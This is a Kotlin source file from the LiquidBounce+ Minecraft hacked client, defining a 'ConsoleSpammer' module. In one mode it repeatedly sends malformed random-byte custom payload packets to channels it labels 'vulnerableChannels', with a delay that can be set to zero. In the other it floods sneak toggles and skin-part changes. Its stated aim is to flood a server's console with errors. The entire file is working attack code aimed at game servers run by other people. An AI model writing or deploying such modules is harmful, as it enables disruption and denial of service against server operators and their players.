/*
 * LiquidBounce+ Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/WYSI-Foundation/LiquidBouncePlus/
 */
package net.ccbluex.liquidbounce.features.module.modules.world

import io.netty.buffer.Unpooled
import net.ccbluex.liquidbounce.event.EventTarget
import net.ccbluex.liquidbounce.event.UpdateEvent
import net.ccbluex.liquidbounce.event.WorldEvent
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.features.module.ModuleCategory
import net.ccbluex.liquidbounce.features.module.ModuleInfo
import net.ccbluex.liquidbounce.utils.timer.MSTimer
import net.ccbluex.liquidbounce.value.IntegerValue
import net.ccbluex.liquidbounce.value.ListValue
import net.minecraft.entity.player.EnumPlayerModelParts
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.C0BPacketEntityAction
import net.minecraft.network.play.client.C17PacketCustomPayload
import java.util.*
import kotlin.random.Random

@ModuleInfo(name = "ConsoleSpammer", spacedName = "Console Spammer", description = "Spams the console of the server with errors.", category = ModuleCategory.WORLD)
class ConsoleSpammer : Module() {

    private val modeValue = ListValue("Mode", arrayOf("Payload", "MineSecure"), "Payload")
    private val delayValue = IntegerValue("Delay", 0, 0, 500, "ms")

    private val payload = PacketBuffer(Unpooled.buffer())
    private val vulnerableChannels = arrayOf("MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem")
    private val timer = MSTimer()

    init {
        val rawPayload = ByteArray(Random.nextInt(128))
        Random.nextBytes(rawPayload)
        payload.writeBytes(rawPayload)
    }

    @EventTarget
    fun onUpdate(event: UpdateEvent) {
        if (!timer.hasTimePassed(delayValue.get().toLong()))
            return

        when (modeValue.get().lowercase(Locale.getDefault())) {
            "payload" -> mc.netHandler.addToSendQueue(
                C17PacketCustomPayload(
                    vulnerableChannels[Random.nextInt(
                        vulnerableChannels.size
                    )], payload
                )
            )

            "minesecure" -> {
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.HAT, Random.nextBoolean())
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.JACKET, Random.nextBoolean())
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.LEFT_PANTS_LEG, Random.nextBoolean())
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.RIGHT_PANTS_LEG, Random.nextBoolean())
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.LEFT_SLEEVE, Random.nextBoolean())
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.RIGHT_SLEEVE, Random.nextBoolean())

                repeat(5) {
                    mc.netHandler.addToSendQueue(
                        C0BPacketEntityAction(
                            mc.thePlayer,
                            C0BPacketEntityAction.Action.STOP_SNEAKING
                        )
                    )
                    mc.netHandler.addToSendQueue(
                        C0BPacketEntityAction(
                            mc.thePlayer,
                            C0BPacketEntityAction.Action.START_SNEAKING
                        )
                    )
                }
            }
        }
    }

    @EventTarget
    fun onWorld(event: WorldEvent) {
        if (event.worldClient == null) {
            state = false
        }
    }

}